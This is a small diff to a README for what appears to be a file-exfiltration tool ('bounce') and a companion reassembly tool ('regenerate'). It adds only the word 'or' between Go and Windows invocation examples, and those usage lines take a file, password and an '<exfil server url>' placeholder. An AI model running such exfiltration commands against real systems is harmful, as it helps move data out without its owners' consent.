@@ -16,6 +16,7 @@ Example:
 ```
 go run bounce.go -f <filename> -p <password> -u <UUID> -e <exfil server url> -v
 ```
+or
 ```
 .\bounce.exe -f <filename> -p <password> -u <UUID> -e <exfil server url> -v
 ```
@@ -27,6 +28,7 @@ Example:
 ```
 go run regenerate.go -i <exported.json> -o <outputfile> -p <password> -u <UUID> -v
 ```
+or
 ```
 .\regenerate.exe -i <exported.json> -o <outputfile> -p <password> -u <UUID> -v
 ```
